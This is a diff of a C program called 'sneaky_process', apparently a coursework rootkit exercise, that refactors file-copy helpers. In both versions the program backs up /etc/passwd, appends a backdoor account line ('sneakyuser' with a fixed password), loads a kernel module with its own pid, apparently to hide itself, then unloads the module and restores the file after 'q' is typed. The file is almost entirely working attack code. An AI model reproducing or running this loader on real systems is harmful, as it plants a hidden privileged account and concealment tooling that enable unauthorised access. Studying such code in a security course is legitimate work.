@@ -1,64 +1,83 @@
-#include <linux/module.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <sys/syscall.h>
 #include <unistd.h>
 
+void copyFile(const char * src, const char * dest) {
+  if (src == NULL || dest == NULL) {
+    exit(-1);
+  }
+
+  FILE * srcFile = fopen(src, "r");
+  if (srcFile == NULL) {
+    printf("Could not open file %s.\n", src);
+    exit(-1);
+  }
+
+  FILE * destFile = fopen(dest, "w+");
+  if (destFile == NULL) {
+    printf("Could not open file %s.\n", dest);
+    fclose(srcFile);
+    exit(-1);
+  }
+  
+  char c;
+  while ((c = fgetc(srcFile)) != -1) {
+    fputc(c, destFile);
+  }
+
+  fclose(destFile);
+  fclose(srcFile);
+}
+
+void insertLine(const char * dest, const char * line) {
+  if (dest == NULL || line == NULL) {
+    exit(-1);
+  }
+
+  FILE * destFile = fopen(dest, "a");
+  if (destFile == NULL) {
+    printf("Could not open file %s.\n", dest);
+    exit(-1);
+  }
+
+  while (*line != '\0') {
+    fputc(*line, destFile);
+    ++line;
+  }
+
+  fclose(destFile);
+}
+
+
 int main() {
-  int pid = getpid();
-  char pidstr[10];
-  sprintf(pidstr, "%d", pid);
-  printf("sneaky_process pid = %d, %s\n", pid, pidstr);
+  // 1. print process id
+  printf("sneaky_process pid = %d\n", getpid());
 
-  FILE * f = fopen("/etc/passwd", "r+");
-  FILE * fd = fopen("/tmp/passwd", "w");
+  // 2. copy file from /etc/passwd to /tmp/passwd
+  copyFile("/etc/passwd", "/tmp/passwd");
 
-  // contrast
-  //  FILE * fdd = fopen("test.txt", "w");
+  // 3. insert a line to the /etc/passwd
+  insertLine("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
 
-  size_t sz = 0;
-  ssize_t len = 0;
-  char * line = NULL;
+  // 4. load the sneaky_mod
+  char args[64];
+  sprintf(args, "insmod sneaky_mod.ko sneaky_pid=%d", (int) getpid());
+  system(args);
 
-  while (len = (getline(&line, &sz, f)) >= 0) {
-    // printf("%s", line);
-    fprintf(fd, "%s", line);
-    // fprintf(fdd, "%s", line);
+  // 5. loop
+  char c;
+  while ((c = getchar()) != 'q') {
+    // empty
   }
 
-  fprintf(f, "%s", "\nsneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
-  // fprintf(fdd, "%s", "\nsneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
-  free(line);
-  fclose(f);
-  fclose(fd);
-  // fclose(fdd);
-  printf("sneaky passwordy stuff done\n");
-  char insn1[64];
-  sprintf(insn1, "insmod sneaky_mod.ko pid=%d pidstr=%s", pid, pidstr);
-  system(insn1);
-  char q;
+  // 6. unload the sneaky_mod
+  system("rmmod sneaky_mod.ko");
 
-  while (q = (getchar()) != 'q') {
-    continue;
-  }
-  system("rmmod sneaky_mod");
-  f = fopen("/etc/passwd", "w");
-  fd = fopen("/tmp/passwd", "r");
-  // fdd = fopen("test.txt", "w");
+  // 7. copy file from /tmp/passwd to /etc/passwd
+  copyFile("/tmp/passwd", "/etc/passwd");
 
-  sz = 0;
-  len = 0;
-  line = NULL;
-
-  while (len = (getline(&line, &sz, fd)) >= 0) {
-    //  printf("%s", line);
-    fprintf(f, "%s", line);
-    // fprintf(fdd, "%s", line);
-  }
-  free(line);
-  fclose(f);
-  fclose(fd);
-  // fclose(fdd);
-
-  printf("sneaky passwordy stuff undone\n");
+  // 8. remove /tmp/passwd
+  system("rm -f /tmp/passwd");
+  
+  return 0;
 }
